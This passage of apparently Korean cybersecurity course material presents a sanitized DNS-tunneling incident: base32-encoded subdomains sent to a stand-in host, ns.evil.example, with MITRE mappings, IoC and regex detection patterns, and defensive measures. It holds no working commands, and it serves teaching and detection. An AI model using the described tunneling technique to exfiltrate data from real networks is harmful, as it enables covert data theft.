- ``bastion_test_progress.json`` — 스텝별 pass/fail 원시

**UI / CLI 요점**

- 대화형 TUI 프롬프트 — 자연어 지시 → 계획 → 실행 → 검증
- `/a2a/mission` (API) — 자율 미션 실행
- Experience→Playbook 승격 — 반복 성공 패턴 저장

> **해석 팁.** 실패 시 output을 분석해 **근본 원인 교정**이 설계의 핵심. 증상 회피/땜빵은 금지.

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (13주차) 학습 주제와 직접 연관된 *실제* incident:

### DNS 터널링 — base32 페이로드

> **출처**: WitFoo Precinct 6 / `incident-2024-08-003` (anchor: `anc-3564198ef1bc`) · sanitized
> **시점**: 2024-08-22 22:47 ~ 25:12 (2시간 25분, 1,247 쿼리)

**관찰**: 10.20.30.80 → ns.evil.example 으로 비정상 길이 DNS 쿼리. subdomain 패턴이 base32 인코딩 ([a-z2-7]{40,60}).

**MITRE ATT&CK**: **T1071.004 (DNS C2)**, **T1048.003 (Exfiltration over Unencrypted Non-C2 Protocol)**

**IoC**:
  - `ns.evil.example`
  - `[a-z2-7]{40,60}\.evil\.example`

**학습 포인트**:
- 정상 DNS subdomain 평균 8~15자, 비정상 40~60자 base32 = 강한 신호
- 평균 8.5건/분 안정 송출 — burst 없는 *조용한 누출* 패턴
- 탐지: Suricata `dsize > 50` + base32 정규식, 또는 entropy 기반 분석
- 방어: outbound DNS 화이트리스트, DNS-over-HTTPS 조직 정책, NXDOMAIN 비율 모니터링


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
